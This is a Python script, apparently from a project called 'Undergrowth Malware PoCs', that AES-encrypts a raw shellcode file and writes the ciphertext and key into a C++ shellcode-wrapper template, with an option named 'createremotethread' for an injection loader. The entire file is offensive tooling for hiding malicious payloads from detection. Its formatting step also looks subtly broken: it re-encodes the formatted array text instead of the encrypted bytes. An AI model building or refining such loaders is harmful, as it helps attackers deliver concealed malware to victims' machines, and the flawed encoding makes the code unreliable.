
import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib
import argparse
from string import Template
import os

templates = {
	'cpp': './templates/encryptedShellcodeWrapper.cpp',

}

resultFiles = {
	'cpp': './results/encryptedShellcodeWrapper.cpp',

}



#======================================================================================================
# Randomized AES Encryption
#======================================================================================================
KEY = get_random_bytes(16)
iv = 16 * b'\x00'
cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

aes_s = ('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
payload_s = ('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
#======================================================================================================
#ARGParsing
#======================================================================================================
if __name__ == '__main__':
	print("Undergrowth.")
	print("\n\n")
	parser = argparse.ArgumentParser(add_help=True, description="Undergrowth Malware PoCs")
	parser.add_argument("shellcodeFile", help="File name containing the raw shellcode to be encoded/encrypted")
	parser.add_argument("-cpp", "--createremotethread", help="Generates C++ file code", action="store_true")
	args = parser.parse_args() 

	if not os.path.isdir("./projects"):
		os.makedirs("./projects")
		print ("[+] Creating [./projects] directory")
#======================================================================================================
#Template Builder
#======================================================================================================
def convertFromTemplate(parameters, templateFile):
	try:
		with open(templateFile) as f:
			src = Template(f.read())
			result = src.substitute(parameters)
			f.close()
			return result
	except IOError:
		print ("[!] Could not open or read template file [{}]".format(templateFile))
		return None

#Read in shellcode as bytearray
def formatCPP(data, key):
	shellcode = "\\x"
	shellcode += "\\x".join(format(ord(b),'02x') for b in data)
	result = convertFromTemplate({'shellcode': shellcode, 'key': key}, templates['cpp'])

	if result != None:
		try:
			fileName = os.path.splitext(resultFiles['cpp'])[0] +  os.path.splitext(resultFiles['cpp'])[1]
			with open(fileName,"w+") as f:
				f.write(result)
				f.close()
				print ("[+] C++ code file saved in [{}]".format(fileName))
		except IOError:
			print ("[!] Could not write C++ code  [{}]".format(fileName))
if args.createremotethread:
	print("Writing payload")
	formatCPP(payload_s, aes_s)
